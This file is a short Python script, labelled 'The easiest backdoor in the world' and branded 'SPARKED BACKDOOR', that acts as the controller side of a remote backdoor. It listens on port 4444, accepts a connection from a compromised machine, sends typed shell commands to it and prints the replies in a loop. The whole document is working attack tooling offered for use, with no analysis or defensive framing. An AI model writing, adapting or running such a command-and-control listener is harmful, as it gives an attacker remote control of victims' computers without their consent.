#            The easiest backdoor in the world.     
#            ___________  ___  ______ _   __ ___________  ______  ___  _____  _   _______ _____  ____________
#           /  ___| ___ \/ _ \ | ___ \ | / /|  ___|  _  \ | ___ \/ _ \/  __ \| | / /  _  \  _  ||  _  | ___  |
#           \ `--.| |_/ / /_\ \| |_/ / |/ / | |__ | | | | | |_/ / /_\ \ /  \/| |/ /| | | | | | || | | | |_/ /
#            `--. \  __/|  _  ||    /|    \ |  __|| | | | | ___ \  _  | |    |    \| | | | | | || | | |    / 
#           /\__/ / |   | | | || |\ \| |\  \| |___| |/ /  | |_/ / | | | \__/\| |\  \ |/ /\ \_/ /\ \_/ / |\ \ 
#           \____/\_|   \_| |_/\_| \_\_| \_/\____/|___/   \____/\_| |_/\____/\_| \_/___/  \___/  \___/\_| \_|
                                                                                                 
    



import socket




SERVER_HOST = '127.0.0.1' # define your IP
SERVER_PORT = 4444 # define your PORT ( OPEN ) | not necessary if it's local




##########################################################

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # socket object for network connection

server.bind((SERVER_HOST, SERVER_PORT)) # Bind socket to IP address and port

server.listen(5) # Listen for incomming connection

##########################################################




print("""
      
 ___________  ___  ______ _   __ ___________  ______  ___  _____  _   _______ _____  ____________
/  ___| ___ \/ _ \ | ___ \ | / /|  ___|  _  \ | ___ \/ _ \/  __ \| | / /  _  \  _  ||  _  | ___  |
\ `--.| |_/ / /_\ \| |_/ / |/ / | |__ | | | | | |_/ / /_\ \ /  \/| |/ /| | | | | | || | | | |_/ /
 `--. \  __/|  _  ||    /|    \ |  __|| | | | | ___ \  _  | |    |    \| | | | | | || | | |    / 
/\__/ / |   | | | || |\ \| |\  \| |___| |/ /  | |_/ / | | | \__/\| |\  \ |/ /\ \_/ /\ \_/ / |\ \ 
\____/\_|   \_| |_/\_| \_\_| \_/\____/|___/   \____/\_| |_/\____/\_| \_/___/  \___/  \___/\_| \_|
                                                                                                 
                                                                                                 
""")




print(f"[+] Listening for incoming connections on {SERVER_HOST}:{SERVER_PORT}\n\n")




client_socket, client_address = server.accept() # # Accepts an incoming connection | client_socket is a new socket used to communicate




print(f"[+] Connection established from - {client_address[0]} | PORT - {client_address[1]}\n\n")




while True:
    command = input("SPARKED BACKDOOR >> ")
    client_socket.send(command.encode())
    if command.lower() == 'exit':
        break
    result = client_socket.recv(1024).decode('latin1')  
    print(result)




client_socket.close()
server.close()